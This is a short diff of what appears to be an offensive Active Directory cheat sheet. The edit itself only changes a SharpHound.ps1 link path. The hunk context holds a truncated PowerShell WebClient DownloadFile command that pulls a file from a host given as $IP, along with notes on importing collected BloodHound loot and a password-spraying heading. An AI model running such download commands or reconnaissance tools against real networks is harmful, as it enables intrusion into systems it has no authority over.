@@ -265,7 +265,7 @@ powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:
 
 	+ Drag and drop the **loot.zip** folder into Bloodhound in order to import the **.json** files
 
-- [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)
+- [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
 
 #### Password spraying
 
